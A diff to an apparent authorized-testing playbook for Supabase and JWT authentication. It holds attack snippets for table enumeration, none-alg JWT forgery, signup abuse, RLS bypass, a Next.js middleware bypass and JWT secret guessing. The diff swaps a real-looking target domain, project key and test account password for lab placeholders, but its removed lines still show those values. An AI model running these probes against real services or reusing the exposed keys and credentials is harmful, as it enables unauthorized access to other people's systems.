@@ -20,7 +20,7 @@ description: Assess OAuth, JWT, and identity flows in an isolated, authorized te
 
 ### 1. Anonymous Key Exposure → Table Enumeration
 ```bash
-ANON_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+ANON_KEY="${SUPABASE_ANON_KEY:?Set the authorized test project's key}"
 SUPABASE_URL="https://PROJECT.supabase.co"
 
 # Enumerate tables via PGRST error hints
@@ -98,8 +98,8 @@ print(f"none-alg admin attempt: {resp.status_code} {resp.text[:200]}")
 
 ### 3. Supabase Auth — Registration Flow Abuse
 ```bash
-SUPABASE_URL="https://srqtxlmisfkiofuixrtm.supabase.co"
-ANON_KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNycXR4bG1pc2ZraW9mdWl4cnRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUyNjM4NjgsImV4cCI6MjEwMDgzOTg2OH0.xLg6a2KSc-f54ny7GC2sc3PWGFUPnHj2yvVbuB3e6xU"
+SUPABASE_URL="https://lab-project.supabase.example"
+ANON_KEY="${SUPABASE_ANON_KEY:?Set the authorized test project's key}"
 
 # Auto-confirm enabled (mailer_autoconfirm: true) — no email verification
 curl -s -X POST "$SUPABASE_URL/auth/v1/signup" \
@@ -114,7 +114,7 @@ curl -s -X POST "$SUPABASE_URL/auth/v1/signup" \
 ### 4. RLS Bypass via Supabase RPC
 ```bash
 # Sometimes RPC functions have weaker RLS than direct table access
-SUPABASE_URL="https://srqtxlmisfkiofuixrtm.supabase.co"
+SUPABASE_URL="https://lab-project.supabase.example"
 ANON_KEY="..."
 USER_TOKEN="..."  # from signup above
 
@@ -133,7 +133,7 @@ done
 # Affects Next.js < 14.2.25, 15.x < 15.2.3
 # Bypass authentication middleware with recursive subrequest header
 
-TARGET="vapelabvca.com"
+TARGET="shop.lab.example"
 # Test against protected routes
 for path in /admin /dashboard /api/admin /api/users /checkout /orders; do
   normal=$(curl -sk "$TARGET$path" -w "%{http_code}" -o /dev/null)
@@ -165,24 +165,19 @@ token = "YOUR_JWT_TOKEN"
 wordlist = [
     "secret", "supersecret", "jwt_secret", "your_jwt_secret",
     "supabase_jwt_secret", "change_me", "password", "12345678",
-    "supabase", "artex", "vapelabvca",
+    "supabase", "artex", "shop-lab",
 ]
 
 for word in wordlist:
     try:
         decoded = jwt.decode(token, word, algorithms=["HS256"])
-        print(f"CRACKED: secret='{word}'")
-        print(decoded)
+        print("A candidate matched. Record the weakness without printing the signing secret or token claims.")
         break
     except:
         pass
 print("Not found in quick wordlist")
 ```
 
-## Supabase vapelabvca.com Known Config
-- URL: `https://srqtxlmisfkiofuixrtm.supabase.co`
-- anon key: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNycXR4bG1pc2ZraW9mdWl4cnRtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUyNjM4NjgsImV4cCI6MjEwMDgzOTg2OH0.xLg6a2KSc-f54ny7GC2sc3PWGFUPnHj2yvVbuB3e6xU`
-- `mailer_autoconfirm: true` — account creation without email verification
-- Tables found (information disclosure via PGRST error): 19+ tables
-- RLS enabled on most tables (filters by user_id)
-- Test account: `pentestaudit2026@proton.me` / `Pentest@2026!`
+## Test configuration
+
+Replace example hosts and accounts with an operator-approved test project. Supply keys through protected environment variables. Do not store or print real account passwords, JWT signing keys, or access tokens in task output.
